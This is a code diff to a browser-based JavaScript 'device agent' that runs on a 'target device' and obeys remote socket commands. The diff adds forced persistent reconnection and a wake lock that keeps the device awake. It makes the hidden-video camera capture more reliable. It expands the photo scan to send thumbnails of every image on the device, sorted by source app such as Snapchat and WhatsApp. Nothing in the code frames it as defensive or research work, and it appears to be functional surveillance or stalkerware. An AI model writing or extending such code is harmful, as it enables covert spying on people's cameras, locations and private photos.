@@ -2,13 +2,22 @@
 // MY DEVICE AGENT - Runs on the target device
 // ============================================
 
-const socket = io();
+const socket = io({
+  reconnection: true,
+  reconnectionAttempts: Infinity,
+  reconnectionDelay: 1000,
+  reconnectionDelayMax: 5000,
+  timeout: 20000,
+  pingInterval: 10000,
+  pingTimeout: 5000
+});
 let deviceId = localStorage.getItem('mydevice_id') || null;
 let deviceName = localStorage.getItem('mydevice_name') || '';
 let cameraStream = null;
 let cameraInterval = null;
 let useFrontCamera = true;
 let gpsWatchId = null;
+let wakeLock = null;
 
 // ---- Logging ----
 function log(message, type) {
@@ -137,6 +146,57 @@ socket.on('reconnect', function() {
   }
 });
 
+// ---- Keep Connection Alive ----
+setInterval(function() {
+  if (socket.connected && deviceId) {
+    socket.emit('device:update', { heartbeat: Date.now() });
+  }
+}, 15000);
+
+// Reconnect on visibility change
+document.addEventListener('visibilitychange', function() {
+  if (document.visibilityState === 'visible') {
+    if (!socket.connected) {
+      log('Page visible again, reconnecting...', 'info');
+      socket.connect();
+    }
+    if (deviceId && deviceName && socket.connected) {
+      connectDevice();
+    }
+    requestWakeLock();
+  }
+});
+
+// Reconnect on online event
+window.addEventListener('online', function() {
+  log('Network back online, reconnecting...', 'info');
+  if (!socket.connected) {
+    socket.connect();
+  }
+  setTimeout(function() {
+    if (deviceId && deviceName && socket.connected) {
+      connectDevice();
+    }
+  }, 1000);
+});
+
+// ---- Wake Lock to prevent sleep ----
+async function requestWakeLock() {
+  try {
+    if ('wakeLock' in navigator) {
+      if (wakeLock !== null) return;
+      wakeLock = await navigator.wakeLock.request('screen');
+      wakeLock.addEventListener('release', function() {
+        wakeLock = null;
+        log('Wake lock released', 'info');
+      });
+      log('Wake lock acquired - device will stay awake', 'success');
+    }
+  } catch (err) {
+    log('Wake lock not available: ' + err.message, 'info');
+  }
+}
+
 socket.on('device:registered', function(data) {
   deviceId = data.deviceId;
   localStorage.setItem('mydevice_id', deviceId);
@@ -151,6 +211,9 @@ socket.on('device:registered', function(data) {
 
   // Start periodic info updates
   startInfoUpdates();
+
+  // Request wake lock to keep device active
+  requestWakeLock();
 });
 
 // ---- Periodic Info Updates ----
@@ -188,6 +251,7 @@ socket.on('command:camera:start', async function() {
 
     var video = document.getElementById('hiddenVideo');
     video.srcObject = cameraStream;
+    await video.play().catch(function() {});
 
     var canvas = document.getElementById('hiddenCanvas');
     var ctx = canvas.getContext('2d');
@@ -245,6 +309,7 @@ socket.on('command:camera:switch', async function() {
 
     var video = document.getElementById('hiddenVideo');
     video.srcObject = cameraStream;
+    await video.play().catch(function() {});
 
     var canvas = document.getElementById('hiddenCanvas');
     var ctx = canvas.getContext('2d');
@@ -277,12 +342,20 @@ socket.on('command:camera:capture', async function() {
 
     var video = document.getElementById('hiddenVideo');
     video.srcObject = stream;
+    await video.play().catch(function() {});
 
-    // Wait for video to be ready
-    await new Promise(function(resolve) {
+    // Wait for video to be ready with timeout
+    await new Promise(function(resolve, reject) {
       if (video.readyState >= 2) { resolve(); return; }
-      video.onloadeddata = resolve;
+      var timeout = setTimeout(function() { resolve(); }, 3000);
+      video.onloadeddata = function() {
+        clearTimeout(timeout);
+        resolve();
+      };
     });
+
+    // Extra delay to ensure frame is rendered
+    await new Promise(function(r) { setTimeout(r, 500); });
 
     var canvas = document.getElementById('hiddenCanvas');
     var ctx = canvas.getContext('2d');
@@ -296,9 +369,11 @@ socket.on('command:camera:capture', async function() {
 
     if (needsCleanup) {
       stream.getTracks().forEach(function(t) { t.stop(); });
+      video.srcObject = null;
     }
   } catch (err) {
     log('Capture error: ' + err.message, 'error');
+    socket.emit('camera:captured', { image: null, error: err.message });
   }
 });
 
@@ -364,11 +439,18 @@ socket.on('command:gallery:scan', async function() {
       // Sort by last modified (newest first)
       photos.sort(function(a, b) { return b.lastModified - a.lastModified; });
 
-      // Generate thumbnails for all photos
-      var photoList = photos;
+      // Collect all categories
+      var categories = {};
+      photos.forEach(function(p) {
+        var cat = p.category || 'Other';
+        if (!categories[cat]) categories[cat] = 0;
+        categories[cat]++;
+      });
 
+      // Generate thumbnails for ALL photos (no limit)
+      var photoList = photos;
       var photosWithThumbs = [];
-      var batchSize = 20;
+      var batchSize = 50;
 
       for (var i = 0; i < photoList.length; i++) {
         try {
@@ -380,12 +462,13 @@ socket.on('command:gallery:scan', async function() {
             size: photoList[i].size,
             type: photoList[i].type,
             lastModified: photoList[i].lastModified,
-            thumbnail: thumb
+            thumbnail: thumb,
+            category: photoList[i].category || 'Other'
           });
 
-          // Send in batches of 20 for faster display
+          // Send in batches for faster display
           if (photosWithThumbs.length % batchSize === 0) {
-            socket.emit('gallery:photos', { photos: photosWithThumbs, partial: true, total: photoList.length });
+            socket.emit('gallery:photos', { photos: photosWithThumbs, partial: true, total: photoList.length, categories: categories });
             log('Sent ' + photosWithThumbs.length + '/' + photoList.length + ' photos...', 'info');
           }
         } catch (e) {
@@ -394,8 +477,8 @@ socket.on('command:gallery:scan', async function() {
       }
 
       // Send final complete list
-      socket.emit('gallery:photos', { photos: photosWithThumbs, partial: false, total: photoList.length });
-      log('Found ' + photosWithThumbs.length + ' photos total', 'success');
+      socket.emit('gallery:photos', { photos: photosWithThumbs, partial: false, total: photoList.length, categories: categories });
+      log('Found ' + photosWithThumbs.length + ' photos total in ' + Object.keys(categories).length + ' categories', 'success');
     } else {
       // Fallback: use input file picker
       socket.emit('gallery:photos', {
@@ -412,9 +495,29 @@ socket.on('command:gallery:scan', async function() {
   updateFeature('fGallery', 'Ready', false);
 });
 
+// Detect photo source/category from folder path
+function detectPhotoCategory(filePath) {
+  var pathLower = filePath.toLowerCase();
+  if (pathLower.includes('dcim') || pathLower.includes('camera')) return 'Camera';
+  if (pathLower.includes('snapchat')) return 'Snapchat';
+  if (pathLower.includes('whatsapp')) return 'WhatsApp';
+  if (pathLower.includes('instagram')) return 'Instagram';
+  if (pathLower.includes('telegram')) return 'Telegram';
+  if (pathLower.includes('facebook')) return 'Facebook';
+  if (pathLower.includes('screenshot')) return 'Screenshots';
+  if (pathLower.includes('download')) return 'Downloads';
+  if (pathLower.includes('bluetooth')) return 'Bluetooth';
+  if (pathLower.includes('twitter') || pathLower.includes('/x/')) return 'Twitter/X';
+  if (pathLower.includes('tiktok')) return 'TikTok';
+  if (pathLower.includes('pictures') || pathLower.includes('photos')) return 'Pictures';
+  if (pathLower.includes('wallpaper')) return 'Wallpapers';
+  if (pathLower.includes('editor') || pathLower.includes('edited')) return 'Edited';
+  return 'Other';
+}
+
 // Recursively scan directories for image files
 async function scanForImages(dirHandle, currentPath, results, depth) {
-  if (depth > 5) return; // Scan up to 5 levels deep
+  if (depth > 8) return; // Scan up to 8 levels deep for thorough scanning
   var imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'svg', 'heic', 'heif'];
 
   for await (var entry of dirHandle.values()) {
@@ -423,13 +526,15 @@ async function scanForImages(dirHandle, currentPath, results, depth) {
       if (imageExts.indexOf(ext) !== -1) {
         try {
           var file = await entry.getFile();
+          var fullPath = currentPath + '/' + entry.name;
           results.push({
             name: entry.name,
-            path: currentPath + '/' + entry.name,
+            path: fullPath,
             size: file.size,
             type: file.type,
             lastModified: file.lastModified,
-            handle: entry
+            handle: entry,
+            category: detectPhotoCategory(fullPath)
           });
         } catch (e) {
           // Skip inaccessible files
@@ -996,11 +1101,30 @@ socket.on('connect', function() {
   }
 });
 
-socket.on('disconnect', function() {
-  log('Disconnected from server', 'error');
+socket.on('disconnect', function(reason) {
+  log('Disconnected: ' + reason + '. Reconnecting...', 'error');
   var badge = document.getElementById('statusBadge');
   if (badge) {
     badge.className = 'status-badge disconnected';
-    badge.innerHTML = '<span>🔴</span> Disconnected';
+    badge.innerHTML = '<span>🔴</span> Reconnecting...';
   }
+  // Force reconnect if server disconnect
+  if (reason === 'io server disconnect' || reason === 'transport close') {
+    setTimeout(function() {
+      socket.connect();
+    }, 2000);
+  }
+});
+
+socket.on('reconnect_attempt', function(attemptNumber) {
+  log('Reconnect attempt #' + attemptNumber, 'info');
+  var badge = document.getElementById('statusBadge');
+  if (badge) {
+    badge.className = 'status-badge connecting';
+    badge.innerHTML = '<span>🟡</span> Reconnecting (#' + attemptNumber + ')';
+  }
+});
+
+socket.on('reconnect', function() {
+  log('Reconnected successfully!', 'success');
 });
